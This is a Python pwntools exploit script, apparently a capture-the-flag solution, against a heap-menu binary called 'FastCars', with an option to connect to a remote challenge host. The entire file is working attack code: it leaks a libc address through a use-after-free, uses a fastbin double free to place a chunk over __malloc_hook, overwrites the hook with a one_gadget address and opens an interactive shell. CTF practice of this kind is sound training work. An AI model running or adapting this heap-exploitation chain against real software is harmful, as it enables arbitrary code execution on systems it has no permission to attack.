#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfinit

import os
import time
import pwn
exe = pwn.context.binary = pwn.ELF('./FastCars')
libc = pwn.ELF("./libc.so.6")
pwn.context.terminal = ["tmux", "splitw", "-h"]
if pwn.args.GDB:
    io = pwn.gdb.debug(exe.path, gdbscript='c\n')
elif pwn.args.REMOTE:
    io = pwn.remote("gc1.eng.run", 32469)
else:
    io = exe.process()


def create(size, content):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'>', f'{size}'.encode())
    io.sendlineafter(b': ', content)
    io.recvuntil(b': ')
    return int(io.recvline(keepends=False))


def delete(idx):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b': ', f'{idx}'.encode())


def view(idx):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b': ', f'{idx}'.encode())
    io.recvuntil(b':\n ')
    return io.recvline(keepends=False)


'''
1 - 0x18
2 - 0x68
3 - 0x1f8
'''
lgchunk = create(3, b"\x00"*0x100)
chunk1 = create(2, b"B"*8)
chunk2 = create(2, b"C"*8)
delete(lgchunk)
libcleak = view(lgchunk)
libcleak = pwn.unpack(libcleak, 'all')
pwn.log.success("LIBC Leak: "+hex(libcleak))
libc.address = libcleak - (0x7fa7617b2b78 - 0x7fa7613ee000)
pwn.log.success("LIBC Base: "+hex(libc.address))
delete(chunk1)
delete(chunk2)
delete(chunk1)
create(2, pwn.p64(libc.sym.__malloc_hook - 0x23))
fake1 = create(2, b"Y"*8)
fake2 = create(2, b"Z"*8)
hook = create(2, b"X"*0x13+pwn.p64(libc.address + 0xf03a4))
# shell = create(2, b"Pwn")
io.interactive()
